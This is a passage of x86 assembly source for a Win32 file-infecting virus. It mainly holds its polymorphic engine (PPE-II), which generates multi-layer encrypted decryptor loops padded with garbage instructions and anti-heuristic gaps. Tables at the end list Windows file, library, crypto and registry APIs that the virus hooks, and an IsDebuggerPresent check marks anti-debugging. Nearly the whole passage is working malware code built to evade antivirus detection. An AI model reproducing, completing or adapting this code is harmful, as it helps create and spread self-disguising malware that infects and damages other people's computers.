		call	__copro_fix_delta

		;  go back
		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ generate layer pointer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function generates pointer to a layers memory map.
		;
		;
		__pglp_old_val	dd	00000000h	;old random value
		__pglp_ov_where dd	00000000h	;pointer to update
		;
ppe_get_layer_pointer:

		; save all registers
		pusha

		; generate random pointer for layers map
		call	gen_garbage
		call	ppe_get_rnd32
		mov	[ebp+__pglp_old_val],eax
		mov	bl,[ebp+mlayer_reg]
		call	ppe_crypt_value
		mov	al,[ebp+mlayer_reg]
		call	__reg_to_bcd
		or	[ebp+used_regs],ah
		or	al,0C0h 		;ADD instruction
		mov	ah,81h
		xchg	ah,al
		stosw
		mov	[ebp+__pglp_ov_where],edi
		stosd
		mov	al,03h			;ADD instruction
		mov	ah,byte ptr [ebp+mlayer_reg]
		shl	ah,3
		or	ah,byte ptr [ebp+gl_index_reg]
		or	ah,0C0h
		stosw
		call	gen_garbage

		; restore registers
		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ function to build brute-multi-layer-poly decoder ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function generates the very perfect decryptor.
		;Scheme:
		;
		;  @@1:  ROR   code_reg, 01h
		;	 (ADD,SUB,XOR) [index_reg], code_reg
		;	 DEC   index_reg
		;	 TEST  [mlayer_reg], 80h
		;	 JNZ   @@2
		;	 INC   index_reg
		;	 INC   index_reg
		;  @@2:  DEC   byte ptr [mlayer_reg]
		;	 TEST  [mlayer_reg], 7Fh
		;	 JNZ   @@1
		;	 TEST  BYTE PTR [mlayer_reg],80h
		;	 JNZ   @@3
		;	 TEST  BYTE PTR [mlayer_reg+1],80H
		;	 JZ    @@4
		;	 DEC   index_reg
		;	 JMP   @@4
		;  @@3:  TEST  BYTE PTR [mlayer_reg+1],80H
		;	 JNZ   @@4
		;	 INC   index_reg
		;  @@4:
		;
		;And it is whole decryptor, very easy to understand... :)
		;
ppe_decoder:

		; save all registers
		pusha

		; build sado-maso decoder :)
		push	edi			;"go back" offset
		mov	[ebp+decoder_back],edi
		call	gen_garbage

		; rotate by code_reg
		mov	ax,0C8D1h		;ROR code_reg, 01h
		or	ah,[ebp+code_reg]
		stosw
		call	gen_garbage

		; select type of coding (ADD, SUB, XOR) ?
		mov	al,00h			;ADD instruction
		cmp	byte ptr [ebp+crypt_style],02h
		jz	__pd_xor
		cmp	byte ptr [ebp+crypt_style],01h
		jnz	__pd_select_regs
		mov	al,28h			;SUB instruction
		jmp	__pd_select_regs
	__pd_xor:
		mov	al,30h			;XOR instruction
	__pd_select_regs:
		mov	ah,[ebp+code_reg]	;code register
		shl	ah,03h
		or	ah,[ebp+index_reg]	;index register
		stosw
		call	gen_garbage

		; change index register
		mov	al,48h			;DEC instruction
		or	al,[ebp+index_reg]	;index register
		stosb
		call	gen_garbage

		; move down or up ? (+/-) flag
		mov	ax,00F6h		;TEST byte [mlayer_reg],80h
		or	ah,[ebp+mlayer_reg]
		stosw
		mov	al,80h			;test last byte
		stosb
		call	gen_garbage_no_flags

		; build JNZ conditional jump (jump if DOWN)
		mov	ax,850Fh		;JNZ instruction
		stosw
		push	edi
		stosd				;do place
		call	gen_garbage
		mov	al,40h			;INC index register
		or	al,[ebp+index_reg]
		stosb
		call	gen_garbage
		stosb
		call	gen_garbage
		pop	ebx			;JNZ offset
		call	gen_garbage
		mov	eax,edi 		;build JNZ offset
		sub	eax,ebx
		sub	eax,4
		mov	[ebx],eax

		; decrease number of movements in layer buffer
		mov	ax,08FEh		;DEC byte ptr [---]
		or	ah,[ebp+mlayer_reg]
		stosw
		call	gen_garbage

		; test whether it was last coding, if yes, next movement
		mov	ax,00F6h		;TEST byte [mlayer_reg],7Fh
		or	ah,[ebp+mlayer_reg]
		stosw
		mov	al,7Fh			;test "x0000000b" status
		stosb
		call	gen_garbage_no_flags

		; build next conditional JNZ jump
		mov	ax,850Fh		;JNZ instruction
		stosw
		pop	eax
		sub	eax,edi
		sub	eax,4
		stosd
		call	gen_garbage

		; generate a lot of TEST instructions and JNZ/JZ cond. jumps
		mov	ax,00F6h		;TEST byte [mlayer_reg],80h
		or	ah,[ebp+mlayer_reg]
		stosw
		mov	al,80h
		stosb
		call	gen_garbage_no_flags
		mov	ax,850Fh		;JNZ instruction
		stosw
		push	edi
		stosd				;update later
		call	gen_garbage
		mov	ax,40F6h		;TEST byte [mlayer_reg+1],80h
		or	ah,[ebp+mlayer_reg]
		stosw
		mov	ax,8001h
		stosw
		call	gen_garbage_no_flags
		mov	ax,840Fh		;JZ instruction
		stosw
		push	edi
		stosd
		call	gen_garbage
		mov	al,48h			;DEC instruction
		or	al,[ebp+index_reg]
		stosb
		call	gen_garbage
		mov	al,0E9h 		;JMP instruction
		stosb
		push	edi
		stosd
		call	gen_garbage
		mov	ebx,[esp+00000008h]	;@@3 update address
		mov	eax,edi
		sub	eax,ebx
		sub	eax,00000004h
		mov	[ebx],eax
		mov	ax,40F6h		;TEST byte [mlayer_reg+1],80h
		or	ah,[ebp+mlayer_reg]
		stosw
		mov	ax,8001h
		stosw
		call	gen_garbage_no_flags
		mov	ax,850Fh		;JNZ instruction
		stosw
		mov	[esp+00000008h],edi
		stosd
		call	gen_garbage
		mov	al,40h			;INC instruction
		or	al,[ebp+index_reg]
		stosb
		call	gen_garbage
		mov	ecx,00000003h
	__pd_update_cjumps:
		pop	ebx			;get @@4 conditional jump
		mov	eax,edi
		sub	eax,ebx
		sub	eax,00000004h
		mov	[ebx],eax
		loop	__pd_update_cjumps

		; restore all registers
		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ generate next code value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function updates code value by code_value_add.
		;

ppe_get_next_code:

		; save all registers
		pusha

		; calculate next code value
		mov	ax,0C081h		;ADD code_reg,code_value_add
		or	ah,[ebp+code_reg]
		stosw
		mov	eax,[ebp+code_value_add]
		stosd
		call	gen_garbage

		; restore all registers
		mov	[esp],edi		;update EDI through POPA
		popa
		ret

;ÄÄÄ´ function to check multi-layers gaps ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function checks whether pointer is in gap (anti-heu-
		;stistic). If it's on that place then i'll change pointer.
		;
		__pgnlp_old	dd	8 dup(0,0)	;old random numbers
		;
ppe_get_next_layer_pointer:

		; save all registers
		pusha

		; increase multi-layer pointer
		call	gen_garbage
		mov	al,40h			;INC instruction
		or	al,[ebp+mlayer_reg]
		stosb
		call	gen_garbage

		; generate some random numbers
		mov	ecx,[ebp+__pglg_num]	;number of gaps
		or	ecx,ecx 		;no gaps ?
		jz	__pgnlp_finish
	__pgnlp_get_nums:
		call	ppe_get_empty_reg
		mov	bl,al			;empty reg to BL
		call	ppe_get_rnd32
		mov	[ebp+__pgnlp_old+ecx*8-8],eax
		call	ppe_crypt_value
		mov	ax,0C081h		;ADD instruction
		or	ah,bl
		stosw
		mov	[ebp+__pgnlp_old+ecx*8-4],edi ;save pos.
		stosd
		mov	al,03h			;ADD instruction
		mov	ah,bl
		shl	ah,3
		or	ah,byte ptr [ebp+gl_index_reg]
		or	ah,0C0h
		stosw
		mov	ax,0C03Bh		;CMP instruction
		shl	bl,3			;empty reg << 3
		or	ah,bl
		or	ah,[ebp+mlayer_reg]
		stosw
		call	gen_garbage_no_flags
		mov	ax,850Fh		;JNZ conditional jump
		stosw
		push	edi
		stosd
		call	gen_garbage
		mov	ax,0C081h		;ADD instruction
		or	ah,[ebp+mlayer_reg]
		stosw
		mov	eax,[ebp+__pglg_num]	;number of gaps
		sub	eax,ecx
		mov	eax,[ebp+__pglg_where+eax*8+4]
		stosd
		call	gen_garbage
		pop	eax
		mov	ebx,edi 		;calculate JNZ offset
		sub	ebx,eax
		sub	ebx,4
		mov	[eax],ebx
		dec	ecx
		jnz	__pgnlp_get_nums
		call	gen_garbage

	__pgnlp_finish:
		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ function to generate decoder-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function generates last JNZ jump to the start of de-
		;coder loop.
		;
		__pge_where	dd	00000000h	;place to update
		;
ppe_get_exloop:

		; save all registers
		pusha

		; build main compare instruction
		call	gen_garbage
		call	ppe_get_empty_reg
		call	__reg_to_bcd
		or	[ebp+used_regs],ah
		mov	bl,al
		mov	eax,[ebp+__mlg_size]	;size of the layers buf
		call	ppe_crypt_value
		call	gen_garbage
		mov	ah,bl			;dest reg
		shl	ah,03h
		or	ah,[ebp+gl_index_reg]
		or	ah,0C0h
		mov	al,03h			;ADD
		stosw
		call	gen_garbage
		mov	ax,0C081h		;ADD
		or	ah,bl
		stosw
		mov	[ebp+__pge_where],edi
		stosd
		call	gen_garbage
		mov	ah,bl
		shl	ah,03h
		or	ah,[ebp+mlayer_reg]
		or	ah,0C0h
		mov	al,3Bh			;CMP instruction
		stosw
		mov	al,bl
		call	__reg_to_bcd
		not	ax
		and	[ebp+used_regs],ah	;disbale register
		call	gen_garbage_no_flags
		mov	ax,850Fh		;JNZ instruction
		stosw
		mov	eax,[ebp+decoder_back]	;build JNZ offset
		sub	eax,edi
		sub	eax,4
		stosd
		call	gen_garbage

		; restore all registers
		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ function to jump to 3rd decoding loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function checks whether virus body has been decrypt-
		;ed by multi-layers engine and then jumps to the 3rd deco-
		;ding loop to finish that work :).
		;
ppe_get_return:

		; save all registers
		pusha

		; save used-regs
		movzx	eax,byte ptr [ebp+gl_index_reg]
		call	__reg_to_bcd
		mov	[ebp+used_regs],ah

		; generate offset to jump back
		call	gen_garbage
		xor	eax,eax
		mov	ebx,[ebp+file_size3]
		sub	ebx,eax
		push	ebx

		; ready to JMP there
		call	ppe_get_empty_reg
		pop	eax
		dec	eax
		not	eax
		call	c_call_reg32		;edi-2 = call reg32 instr
		mov	eax,[ebp+g_cr32_jump]
		add	byte ptr [eax-1],10h	;CALL reg32 --> JMP reg32

		; generate final garbages
		mov	eax,00000005h
		call	ppe_get_rnd_range
		add	eax,00000005h
		mov	ecx,eax
	__pgr_final:
		call	gen_garbage
		loop	__pgr_final

		; restore all registers
		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ function to create multi-layer buffer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function builds multi-layers buffer behind our poly-
		;morphic code.
		;
ppe_get_mlayer_buffer:

		; save all registers
		pusha

		; copy buffer from memory to EDI
		push	edi			;start of memory layer buf
		mov	esi,[ebp+__mlg_map]	;layers in memory
		mov	ecx,[ebp+__mlg_size]	;size of the buffer
		rep	movsb

		; generate some last garbages
		mov	eax,00000005h
		call	ppe_get_rnd_range
		add	eax,00000005h
	__pgmb_generate:
		call	gen_garbage
		dec	eax
		jnz	__pgmb_generate

		; update multi-layer pointer in "ppe_get_layer_pointer"
		pop	ebx			;start of mem layers buffers
		sub	ebx,[ebp+poly_start]	;EAX - poly_start = pos
		mov	eax,ebx
		sub	eax,[ebp+__pglp_old_val]
		mov	edx,[ebp+__pglp_ov_where]
		mov	[edx],eax

		; update multi-layer pointer in "ppe_get_exloop"
		mov	edx,[ebp+__pge_where]
		mov	[edx],ebx

		; update multi-layer pointers in "ppe_get_next_layer_pointer"
		mov	esi,[ebp+__pglg_num]
		xor	ecx,ecx
		or	esi,esi 		;no gaps ?
		jz	__pgmb_finish
	__pgmb_next_change:
		inc	ecx
		mov	eax,ebx
		add	eax,[ebp+__pglg_where+ecx*8-8];where is the gap
		sub	eax,[ebp+__pgnlp_old+esi*8-8] ;get random number
		mov	edx,[ebp+__pgnlp_old+esi*8-4] ;position
		mov	[edx],eax
		dec	esi
		cmp	[ebp+__pglg_num],ecx
		jnz	__pgmb_next_change

		; restore all registers
	__pgmb_finish:
		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ function for write insignificant data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ppe_gen_rnd_block:
		mov	eax,00000014h
		call	ppe_get_rnd_range
		add	eax,00000005h
		mov	ecx,eax

ppe_gen_rnd_fill:
		cld
		movzx	eax,byte ptr [ebp+compare_index]
		cmp	eax,00000005h
		jae	ppe_gen_rnd_loop
		push	ebx
		mov	ebx,eax
		mov	eax,ecx
		sub	eax,00000004h		;far JMP's five bytes - 1
		call	ppe_get_rnd_range
		add	eax,edi
		sub	eax,[ebp+poly_start]
		mov	[ebp+compare_buffer+ebx*04h],eax
		inc	byte ptr [ebp+compare_index]
		pop	ebx
ppe_gen_rnd_loop:
		call	ppe_get_rnd32
		stosb
		loop	ppe_gen_rnd_loop
		ret

;ÄÄÄ´ functions returns (empty) base reg ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ppe_get_reg:	mov	eax,00000008h
		call	ppe_get_rnd_range
		lea	ebx,dword ptr [ebp+tbl_regs+eax*02h]
		ret

ppe_get_empty_reg:
		call	ppe_get_reg
		test	byte ptr [ebx+REG_FLAGS],REG_IS_STACK
		jnz	ppe_get_empty_reg
		call	__reg_to_bcd
		test	[ebp+used_regs],ah
		jnz	ppe_get_empty_reg
		movzx	ax,al
		ret

	__reg_to_bcd:
		push	ebx
		movzx	ebx,al
		movzx	ebx,byte ptr [ebp+tbl_regs_bcd+ebx]
		mov	ah,bl
		pop	ebx
		ret

;ÄÄÄ´ random numbers ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ppe_get_rnd32:
		push	ebx ecx edx		;my special algorithm to
		mov	eax,[ebp+poly_seed]	;calculate a random number
		mov	ecx,41C64E6Dh		;for Win32
		mul	ecx
		xchg	eax,ecx
		call	[ebp+ddGetTickCount]
		mov	ebx,eax
		db	0Fh, 31h		;RDTCS instruction - read
		xor	eax,ebx
		xchg	ecx,eax 		;PCs ticks to EDX:EAX
		mul	ecx
		add	eax,00003039h
		mov	[ebp+poly_seed],eax
		pop	edx ecx ebx
		ret

ppe_get_rnd_range:
		push	ecx edx
		mov	ecx,eax
		call	ppe_get_rnd32
		xor	edx,edx
		div	ecx
		mov	eax,edx
		pop	edx ecx
		ret

;ÄÄÄ´ polymorphic tables (PPE-II) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		; some equ's needed by Prizzy Polymorphic Engine (PPE-II)

REG_NO_8BIT	equ	1			;esi,edi,ebp aren't 8bit
REG_IS_STACK	equ	2			;reg is stack because of copro
REG_FLAGS	equ	1			;one byte to set tbl_regs' flags
USED_MEMORY	equ	30			;we must be far then 30 bytes in poly
USED_BASED	equ	1			;don't generate copro
USED_FLAGS	equ	2			;generated garbages can't modify flags

		; table of registers
		; DO NOT modify this table or the next because they're
		; dependent on - because of tranfer to reg_bcd

tbl_regs	equ	this byte
		db	00000000b,00h		;eax
		db	00000001b,00h		;ecx
		db	00000010b,00h		;edx
		db	00000011b,00h		;ebx
		db	00000100b,REG_IS_STACK	;esp
		db	00000101b,REG_NO_8BIT	;ebp
		db	00000110b,REG_NO_8BIT	;esi
		db	00000111b,REG_NO_8BIT	;edi
end_regs	equ	this byte

		; table for use registers, DO NOT modify or move

tbl_regs_bcd	equ	this byte
		db	00000001b		;eax, st(0)
		db	00000010b		;ecx, st(1)
		db	00000100b		;edx, st(2)
		db	00001000b		;ebx, st(3)
		db	00010000b		;esp, st(4)
		db	00100000b		;ebp, st(5)
		db	01000000b		;esi, st(4)
		db	10000000b		;edi, st(7)
end_regs_bcd	equ	this byte

		; opcodes for math reg,imm

tbl_math_imm	equ	this byte
		db	0C0h			;add
		db	0C8h			;or
		db	0E0h			;and
		db	0E8h			;sub
		db	0F0h			;xor
		db	0D0h			;adc
		db	0D8h			;sbb
end_math_imm	equ	this byte

		; opcodes for math reg,reg

tbl_math_reg	equ	this byte
		db	03h			;add
		db	0Bh			;or
		db	13h			;adc
		db	1Bh			;sbb
		db	23h			;and
		db	2Bh			;sub
		db	33h			;xor
end_math_reg	equ	this byte

		; one byte instructions that doesn't modify reg

tbl_save_code	equ	this byte
		clc
		stc
		cmc
		cld
		std
end_save_code	equ	this byte

		; opcodes for rotate/shift reg,imm

tbl_rs_imm	equ	this byte
		db	0C0h			;rol
		db	0C8h			;ror
		db	0D0h			;rcl
		db	0D8h			;rcr
		db	0E0h			;shl
		db	0E8h			;shr
		db	0F8h			;sar
end_rs_imm	equ	this byte

		; opcodes for bit tests reg,imm

tbl_bt_imm	equ	this byte
		db	0E0h, 0E8h, 0F0h, 0F8h	;bt, bts, btr, btc
end_bt_imm	equ	this byte

		; opcodes for bit tests reg,reg

tbl_bt_reg	equ	this byte
		db	0A3h, 0ABh, 0B3h, 0BBh	;bt, bts, btr btc
end_bt_reg	equ	this byte

		; opcodes for generate defined number
		; decode_instruction = encode_instruction + 1st_number
		; reg32 = 2nd_number + defined_reg32
		; immX	= 3rd_number * 8

tbl_num_code	equ	this byte
		db	003h,081h,0C0h,04h	;add (reg32), imm32
		db	0FBh,081h,0E8h,04h	;sub (reg32), imm32
		db	0FFh,081h,0F0h,04h	;xor (reg32), imm32
		db	003h,0C1h,0C0h,01h	;rol (reg32), imm8
		db	0FBh,0C1h,0C8h,01h	;ror (reg32), imm8
		db	0FFh,0F7h,0D0h,00h	;not (reg32)
end_num_code	equ	this byte

		; table of rep/repnz operations

tbl_repeat	equ	this byte
		dd	offset __gr_cmps	;compare mem operand
		dd	offset __gr_lods	;load mem operand
		dd	offset __gr_stos	;store mem data
		dd	offset __gr_scas	;scan mem
		dd	offset __gr_movs	;move data from mem to mem
end_repeat	equ	this byte

		; table of the second encode-loop
		; the first  value means - count
		; the second value means - random select ?
		; the third  value means - already generated ?

tbl_encode_loop equ	this byte
		db	05h, 01h
		dd	00000000h, offset ppe_lloop_generate
		dd	00000000h, offset ppe_mlayer_generate
		dd	00000000h, offset ppe_brute_init
		dd	00000000h, offset ppe_get_delta
		dd	00000000h, offset ppe_get_layer_gaps
		db	02h, 00h
		dd	00000000h, offset ppe_get_index
		dd	00000000h, offset ppe_get_layer_pointer
		db	01h, 01h
		dd	00000000h, offset ppe_decoder
		db	02h, 00h
		dd	00000000h, offset ppe_get_next_code
		dd	00000000h, offset ppe_get_next_layer_pointer
		db	03h, 01h
		dd	00000000h, offset ppe_get_exloop
		dd	00000000h, offset ppe_get_return
		dd	00000000h, offset ppe_get_mlayer_buffer
end_encode_loop equ	this byte

		; table of the instructions which they don't modify flags
		; 1st value = move to original instructions
		; 2nd value = how many garbages don't modify flags

tbl_no_flags	equ	this byte
		db	06h, (__no_flags_1 - tbl_garbage) / 04h
		db	06h, (__no_flags_2 - tbl_garbage) / 04h
end_no_flags	equ	this byte

		; hyper table of garbages (support only copro)
		; where __no_flags_X means the following garbages don't
		; modify any flags, do NOT modify this table 'cause of flags

tbl_garbage	equ	this byte
		dd	offset g_push_g_pop	;push reg/garbage/pop reg
   __no_flags_1:dd	offset g_movreg32imm	;mov reg32,imm
		dd	offset g_movreg16imm	;mov reg16,imm
		dd	offset g_movreg8imm	;mov reg8,imm
		dd	offset g_movregreg32	;mov reg32,reg32
		dd	offset g_movregreg16	;mov reg16,reg16
		dd	offset g_movregreg8	;mov reg8,reg8
		dd	offset g_mathreg32imm	;math reg32,imm
		dd	offset g_mathreg16imm	;math reg16,imm
		dd	offset g_mathreg8imm	;math reg8,imm
   __no_flags_2:dd	offset g_call_cont	;call/garbage/pop
		dd	offset g_jump_u 	;jump/rnd data
		dd	offset g_jump_c 	;jump conditional/garbage
		dd	offset g_movzx_movsx_32 ;movzx/movsx reg32,reg16
		dd	offset g_movzx_movsx_16 ;movzx/movsx reg16,reg8
		dd	offset g_movzx_movsx_8	;movzx/movsx reg32,reg8
		dd	offset g_rotate_shift32 ;(rcr,sal...) reg32,imm8
		dd	offset g_rotate_shift16 ;(ror,shl...) reg16,imm8
		dd	offset g_rotate_shift8	;(rol,shr...) reg8,imm8
		dd	offset g_rs_reg32reg8	;(rcr,sal...) reg32,reg8
		dd	offset g_rs_reg16reg8	;(ror,shl...) reg16,reg8
		dd	offset g_rs_reg8reg8	;(rol,shr...) reg8,reg8
		dd	offset g_bit_test32	;(bsf,bsr...) reg32,imm8
		dd	offset g_bit_test16	;(btc,bts...) reg16,imm8
		dd	offset g_bt_regreg32	;(bsf,bsr...) reg32,reg32
		dd	offset g_bt_regreg16	;(btc,bts...) reg16,reg16
		dd	offset g_mathregreg32	;(add,sub...) reg32,reg32
		dd	offset g_mathregreg16	;(xor,and...) reg16,reg16
		dd	offset g_mathregreg8	;(sbb,adc...) reg8,reg8
		dd	offset g_set_byte	;(seta,setp.) reg8
		dd	offset g_loop		;garbage/(loope/loopnz...)
		dd	offset g_loop_jump	;garbage/(dec reg8/16/32, jnz)
		dd	offset g_call_reg32	;gen reg32/call reg32/rndblock/pop reg32
		dd	offset g_jump_reg32	;gen reg32/jump reg32/rndblock
		dd	offset g_repeat 	;gen regz/rep(lods,cmps...)
		dd	offset g_pushpop_value	;push rnd(32/16)/garbage/pop reg32
		dd	offset g_crypt_value	;crypt rnd32 value to reg32
		dd	offset g_compare	;dec reg32/cmp r32,r32/jnz
end_garbage	equ	this byte

__garbage_based_num	equ	(offset end_garbage - offset tbl_garbage) / 04h

;ÄÄÄ´ some valuez needed by virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

			; kernel32's base address & its functions
kernel_base		dd	00000000h	;thx to z0mbie & Vecna
user32_base		dd	00000000h	;used in "kernel memory"
advapi_base		dd	00000000h

			; my big APIs table, using three libraries

	FunctionAddresses:
ddGetProcAddress	dd	00000000h	;standard functions
ddGetModuleHandleA	dd	00000000h
ddGetDriveTypeA 	dd	00000000h
ddFindFirstFileA	dd	00000000h	;FindFIles functions
ddFindNextFileA 	dd	00000000h
ddFindClose		dd	00000000h
ddReadFile		dd	00000000h	;FileHandle functions
ddWriteFile		dd	00000000h
ddSetFilePointer	dd	00000000h
ddSetEndOfFile		dd	00000000h
ddCloseHandle		dd	00000000h
ddDeleteFileA		dd	00000000h
ddSetFileAttributesA	dd	00000000h
ddCreateFileMappingA	dd	00000000h	;memory-mapped functions
ddMapViewOfFile 	dd	00000000h
ddUnmapViewOfFile	dd	00000000h
ddGetTempPathA		dd	00000000h	;get windows information
ddGetTempFileNameA	dd	00000000h
ddGetSystemDirectoryA	dd	00000000h
ddGetWindowsDirectoryA	dd	00000000h
ddWritePrivatePFStringA dd	00000000h
ddGetModuleFileNameA	dd	00000000h
ddGetVersion		dd	00000000h
ddGetStartupInfoA	dd	00000000h	;process information
ddWaitForSingleObject	dd	00000000h
ddCreateProcessA	dd	00000000h
ddOpenProcess		dd	00000000h
ddGetCurrentProcessId	dd	00000000h
ddCreateMutexA		dd	00000000h
ddReleaseMutex		dd	00000000h
ddSleep 		dd	00000000h
ddTerminateProcess	dd	00000000h
ddGetSystemTime 	dd	00000000h	;date & time functions
ddGetTickCount		dd	00000000h
ddGetFileSize		dd	00000000h
ddGetFileTime		dd	00000000h
ddSetFileTime		dd	00000000h
ddFileTimeToSystemTime	dd	00000000h
ddSystemTimeToFileTime	dd	00000000h
ddIsDebuggerPresent	dd	00000000h	;anti-debugging & anti-emul
ddCreateThread		dd	00000000h
ddWideCharToMultiByte	dd	00000000h	;stringz, characterz
ddlstrcat		dd	00000000h
ddlstrlen		dd	00000000h
ddIsBadCodePtr		dd	00000000h
ddGetLastError		dd	00000000h
	HookedAddresses:
ddCreateFileW		dd	00000000h	;opening files APIs
ddCreateFileA		dd	00000000h
ddOpenFile		dd	00000000h
dd_lopen		dd	00000000h
ddCopyFileW		dd	00000000h	;Copy/Move files APIs
ddCopyFileA		dd	00000000h
ddMoveFileW		dd	00000000h
ddMoveFileA		dd	00000000h
ddMoveFileExW		dd	00000000h
ddMoveFileExA		dd	00000000h
ddLoadLibraryW		dd	00000000h	;opening libraries APIs
ddLoadLibraryA		dd	00000000h
ddLoadLibraryExW	dd	00000000h
ddLoadLibraryExA	dd	00000000h
ddFreeLibrary		dd	00000000h

			; functions from ADVAPI32.DLL library
	HookedAddresses_advapi32:
ddCryptAcquireContextA	dd	00000000h	;Cryptography functions
ddCryptExportKey	dd	00000000h
ddCryptImportKey	dd	00000000h
ddCryptGetUserKey	dd	00000000h
ddCryptGetProvParam	dd	00000000h
ddCryptGenKey		dd	00000000h
ddCryptEncrypt		dd	00000000h
ddCryptDecrypt		dd	00000000h
ddCryptDestroyKey	dd	00000000h
ddCryptReleaseContext	dd	00000000h
ddRegOpenKeyExA 	dd	00000000h	;Registry functions
ddRegQueryValueExA	dd	00000000h
ddRegQueryInfoKeyA	dd	00000000h
ddRegEnumValueA 	dd	00000000h
ddRegSetValueExA	dd	00000000h
ddRegCreateKeyExA	dd	00000000h
ddRegCloseKey		dd	00000000h

			; functions from USER32.DLL library
	HookedAddresses_user32:
ddSetTimer		dd	00000000h
ddKillTimer		dd	00000000h
ddFindWindowA		dd	00000000h
ddPostMessageA		dd	00000000h
ddCharUpperBuffA	dd	00000000h


	FunctionNames:
szGetProcAddress:	__macro_CRC32 <GetProcAddress>
szGetModuleHandleA:	__macro_CRC32 <GetModuleHandleA>
szGetDriveTypeA:	__macro_CRC32 <GetDriveTypeA>
szFindFirstFileA:	__macro_CRC32 <FindFirstFileA>
szFindNextFileA:	__macro_CRC32 <FindNextFileA>
szFindClose:		__macro_CRC32 <FindClose>
szReadFile:		__macro_CRC32 <ReadFile>
szWriteFile:		__macro_CRC32 <WriteFile>
szSetFilePointer:	__macro_CRC32 <SetFilePointer>
szSetEndOfFile: 	__macro_CRC32 <SetEndOfFile>
szCloseHandle:		__macro_CRC32 <CloseHandle>
szDeleteFileA:		__macro_CRC32 <DeleteFileA>
szSetFileAttributesA:	__macro_CRC32 <SetFileAttributesA>
szCreateFileMappingA:	__macro_CRC32 <CreateFileMappingA>
szMapViewOfFile:	__macro_CRC32 <MapViewOfFile>
szUnmapViewOfFile:	__macro_CRC32 <UnmapViewOfFile>
szGetTempPathA: 	__macro_CRC32 <GetTempPathA>
szGetTempFileName:	__macro_CRC32 <GetTempFileNameA>
szGetSystemDirectoryA:	__macro_CRC32 <GetSystemDirectoryA>
szGetWindowsDirectoryA: __macro_CRC32 <GetWindowsDirectoryA>
szWritePrivatePFStringA:__macro_CRC32 <WritePrivateProfileStringA>
szGetModuleFileNameA:	__macro_CRC32 <GetModuleFileNameA>
szGetVersion:		__macro_CRC32 <GetVersion>
szGetStartupInfoA:	__macro_CRC32 <GetStartupInfoA>
szWaitForSingleObject:	__macro_CRC32 <WaitForSingleObject>
szCreateProcessA:	__macro_CRC32 <CreateProcessA>
szOpenProcess:		__macro_CRC32 <OpenProcess>
szGetCurrentProcessId:	__macro_CRC32 <GetCurrentProcessId>
szCreateMutexA: 	__macro_CRC32 <CreateMutexA>
szReleaseMutex: 	__macro_CRC32 <ReleaseMutex>
szSleep:		__macro_CRC32 <Sleep>
szTerminateProcess:	__macro_CRC32 <TerminateProcess>
szGetSystemTime:	__macro_CRC32 <GetSystemTime>
szGetTickCount: 	__macro_CRC32 <GetTickCount>
szGetFileSize:		__macro_CRC32 <GetFileSize>
szGetFileTime:		__macro_CRC32 <GetFileTime>
szSetFileTime:		__macro_CRC32 <SetFileTime>
szFileTimeToSystemTime: __macro_CRC32 <FileTimeToSystemTime>
szSystemTimeToFileTime: __macro_CRC32 <SystemTimeToFileTime>
szIsDebuggerPresent:	__macro_CRC32 <IsDebuggerPresent>
szCreateThread: 	__macro_CRC32 <CreateThread>
szWideCharToMultiByte:	__macro_CRC32 <WideCharToMultiByte>
szlstrcat:		__macro_CRC32 <lstrcat>
szlstrlen:		__macro_CRC32 <lstrlen>
szIsBadCodePtr: 	__macro_CRC32 <IsBadCodePtr>
szGetLastError: 	__macro_CRC32 <GetLastError>
	Hooked_API:
szCreateFileW:		__macro_CRC32 <CreateFileW>
szCreateFileA:		__macro_CRC32 <CreateFileA>
szOpenFile:		__macro_CRC32 <OpenFile>
sz_lopen:		__macro_CRC32 <_lopen>
szCopyFileW:		__macro_CRC32 <CopyFileW>
szCopyFileA:		__macro_CRC32 <CopyFileA>
szMoveFIleW:		__macro_CRC32 <MoveFileW>
szMoveFileA:		__macro_CRC32 <MoveFileA>
szMoveFileExW:		__macro_CRC32 <MoveFileExW>
szMoveFileExA:		__macro_CRC32 <MoveFileExA>
szLoadLibraryW: 	__macro_CRC32 <LoadLibraryW>
szLoadLibraryA: 	__macro_CRC32 <LoadLibraryA>
szLoadLibraryExW:	__macro_CRC32 <LoadLibraryExW>
szLoadLibraryExA:	__macro_CRC32 <LoadLibraryExA>
